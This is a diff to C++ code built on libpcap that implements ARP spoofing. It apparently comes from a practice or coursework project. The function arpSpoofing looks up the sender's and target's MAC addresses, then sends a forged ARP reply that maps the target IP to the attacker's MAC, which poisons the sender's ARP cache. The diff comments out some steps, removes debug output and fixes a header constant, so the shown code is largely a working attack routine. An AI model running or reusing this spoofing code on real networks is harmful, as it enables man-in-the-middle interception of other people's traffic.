@@ -174,22 +174,20 @@ void arpSpoofing(pcap_t* handle, char* sendIP, char* targetIP, MyAddr attacker)
     //0. get MAC addr
     sendARPRequest(handle,attacker.mac_,Mac::broadcastMac(),attacker.mac_,attacker.ip_,Mac::nullMac(),tIP);
     Mac tMAC = getMACAddr(handle, tIP);
-    printf("tmac : %s\n",std::string(tMAC).c_str());
     sendARPRequest(handle,attacker.mac_,Mac::broadcastMac(),attacker.mac_,attacker.ip_,Mac::nullMac(),sIP);
     Mac sMAC = getMACAddr(handle, sIP);
-    printf("smac : %s\n",std::string(sMAC).c_str());
 
-    //1. sender PC request
-    sendARPRequest(handle, sMAC,Mac::broadcastMac(),sMAC,sIP,Mac::nullMac(),tIP);
+//    //1. sender PC request
+//    sendARPRequest(handle, sMAC,Mac::broadcastMac(),sMAC,sIP,Mac::nullMac(),tIP);
 
-    //2. target PC reply
-    sendARPReply(handle,tMAC,sMAC,tMAC,tIP,sMAC,sIP);
+//    //2. target PC reply
+//    sendARPReply(handle,tMAC,sMAC,tMAC,tIP,sMAC,sIP);
 
     //3. attacker PC reply
     sendARPReply(handle,attacker.mac_,sMAC,attacker.mac_,tIP,sMAC,sIP);
 
-    //4. attacker PC request
-    sendARPRequest(handle,attacker.mac_,sMAC,attacker.mac_,tIP,Mac::nullMac(),rIP);
+//    //4. attacker PC request
+//    sendARPRequest(handle,attacker.mac_,sMAC,attacker.mac_,tIP,Mac::nullMac(),rIP);
 
 }
 
@@ -201,7 +199,7 @@ void sendARPRequest(pcap_t* handle, Mac eth_smac, Mac eth_dmac, Mac arp_smac, Ip
     packet.eth_.dmac_ = eth_dmac;
     packet.eth_.type_ = htons(EthHdr::Arp);
 
-    packet.arp_.hrd_ = htons(ArpHdr::EETHER);
+    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
     packet.arp_.pro_ = htons(EthHdr::Ip4);
     packet.arp_.hln_ = Mac::SIZE;
     packet.arp_.pln_ = Ip::SIZE;
@@ -227,7 +225,7 @@ void sendARPReply(pcap_t* handle, Mac eth_smac, Mac eth_dmac, Mac arp_smac, Ip a
     packet.eth_.dmac_ = eth_dmac;
     packet.eth_.type_ = htons(EthHdr::Arp);
 
-    packet.arp_.hrd_ = htons(ArpHdr::EETHER);
+    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
     packet.arp_.pro_ = htons(EthHdr::Ip4);
     packet.arp_.hln_ = Mac::SIZE;
     packet.arp_.pln_ = Ip::SIZE;
